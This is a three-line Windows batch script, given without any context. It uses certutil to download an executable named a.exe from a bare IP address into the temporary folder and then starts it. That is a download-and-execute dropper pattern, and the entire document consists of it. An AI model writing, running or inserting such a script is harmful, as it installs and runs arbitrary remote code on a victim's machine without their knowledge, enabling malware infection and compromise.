@echo off
certutil -urlcache -split -f http://93.184.216.34/a.exe %TEMP%\a.exe
start "" %TEMP%\a.exe
